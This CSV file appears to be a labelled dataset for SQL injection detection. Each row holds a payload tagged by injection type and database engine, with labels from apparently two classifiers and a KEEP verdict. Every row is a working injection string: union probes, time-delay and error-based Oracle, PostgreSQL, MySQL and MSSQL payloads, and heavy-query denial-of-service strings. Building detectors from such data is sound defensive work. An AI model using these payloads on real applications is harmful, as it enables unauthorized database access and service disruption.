payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1058,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1059,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
1' ) ) as dckd where 1794 = 1794,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1060,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as dckd where 1794 = 1794
1' waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,1061,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1' waitfor delay '0:0:5'--
"1"" ) ) ) and 4595 = 4595#",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1062,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) ) and 4595 = 4595#"
select pg_sleep ( 5 ) and ( ( ( '%' = ',time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1063,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and ( ( ( '%' = '
"1, ( select ( case when ( 8382 = 8382 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,1064,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1, ( select ( case when ( 8382 = 8382 ) then 1 else 1/ ( select 0 ) end ) )"
select ( case when ( 4624 = 4844 ) then 4624 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,1065,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4624 = 4844 ) then 4624 else 1/ ( select 0 ) end ) --
"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""uisi"" = ""uisi",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1066,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""uisi"" = ""uisi"
"-5661' ) ) union all select 3011,3011#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1067,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5661' ) ) union all select 3011,3011#"
"1', ( select ( case when ( 6560 = 2813 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,1068,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1', ( select ( case when ( 6560 = 2813 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )"
"-6292 ) union all select 7499,7499,7499,7499,7499,7499,7499--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1069,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6292 ) union all select 7499,7499,7499,7499,7499,7499,7499--"
"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- gkcl",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,1070,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- gkcl"
"1"" union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1071,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" union all select null,null,null#"
1' and 4374 = 2305,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1072,boolean_blind,generic,Pattern match: 'and 4374 = 2305' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' and 4374 = 2305
-2100' where 9260 = 9260 or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1073,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2100' where 9260 = 9260 or 3038 = 3038
"-8098%' ) union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1074,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8098%' ) union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#"
1' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'guxv' = 'guxv,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1075,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'guxv' = 'guxv
"1"" ) ) as uycc where 4364 = 4364 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1076,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) as uycc where 4364 = 4364 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"-4145%"" ) ) union all select 9404,9404,9404,9404,9404,9404,9404#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1077,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4145%"" ) ) union all select 9404,9404,9404,9404,9404,9404,9404#"
"1 ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 7484 = 7484",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1078,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 7484 = 7484"
1' ) as yyyb where 1705 = 1705 and ( 8770 = 6988 ) *6988--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1079,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) as yyyb where 1705 = 1705 and ( 8770 = 6988 ) *6988--
"1%' ) ) ) union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1080,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) ) union all select null,null--"
-9145' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'yvfl' like 'yvfl,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1081,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,-9145' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'yvfl' like 'yvfl
"1%"" union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1082,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" union all select null,null,null,null,null,null,null#"
"1'+ ( select unzl where 3432 = 3432 union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1083,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select unzl where 3432 = 3432 union all select null,null,null,null--"
"1'+ ( select 'gqsk' where 3087 = 3087 union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1084,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select 'gqsk' where 3087 = 3087 union all select null,null,null,null--"
-5967 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) # lhoh,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1085,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-5967 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) # lhoh
"1'+ ( select dyfw where 7743 = 7743 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1086,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1'+ ( select dyfw where 7743 = 7743 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'"
1' ) where 9272 = 9272,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1087,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 9272 = 9272
"1%"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1088,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #"
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,1089,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds"
"1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #",time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,1090,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #"
"1'|| ( select 'vekn' from dual where 4929 = 4929 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1091,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'|| ( select 'vekn' from dual where 4929 = 4929 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'"
1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'cqwz' like 'cqwz,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1092,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'cqwz' like 'cqwz
1%' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1093,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1%' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and '%' = '
"1"" where 9230 = 9230",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1094,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 9230 = 9230"
"1"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""msjh"" like ""msjh",error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1095,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"1"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""msjh"" like ""msjh"
1' ) ) as plgq where 1121 = 1121,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1096,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as plgq where 1121 = 1121
"-4571' union all select 3227,3227,3227,3227--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1097,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4571' union all select 3227,3227,3227,3227--"
"1"" ) where 5698 = 5698 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1098,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) where 5698 = 5698 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" rlike ( select ( case when ( 5552 = 1712 ) then 1 else 0x28 end ) )",boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1099,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" rlike ( select ( case when ( 5552 = 1712 ) then 1 else 0x28 end ) )"
"-5026' where 7324 = 7324 union all select 7324,7324--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1100,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5026' where 7324 = 7324 union all select 7324,7324--"
"1"" ) ) as sdlv where 5922 = 5922 and 2006 = 2006",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1101,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) as sdlv where 5922 = 5922 and 2006 = 2006"
"-4546' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,1102,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-4546' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
-7021' or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1103,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7021' or 3038 = 3038
-7565' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'gymz' = 'gymz,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1104,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,-7565' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'gymz' = 'gymz
"1 ) as bfuy where 3879 = 3879 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1105,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) as bfuy where 3879 = 3879 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1"" ) ) as isqj where 6344 = 6344 union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1106,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as isqj where 6344 = 6344 union all select null,null,null,null--"
"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'kpsg' like 'kpsg",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1107,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'kpsg' like 'kpsg"
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'cgbf' like 'cgbf",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,1108,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'cgbf' like 'cgbf"
"1%' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and '%' = '",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1109,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and '%' = '"
"-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb",error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,1110,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb"
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1111,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#"
1' where 4460 = 4460,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1112,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 4460 = 4460
"-3595'+ ( select vppx where 6018 = 6018 union all select 6018,6018,6018,6018,6018#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1113,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3595'+ ( select vppx where 6018 = 6018 union all select 6018,6018,6018,6018,6018#"
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,1114,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
-2241 ) where 7606 = 7606 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1115,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-2241 ) where 7606 = 7606 or ( 8459 = 8459 ) *4906--
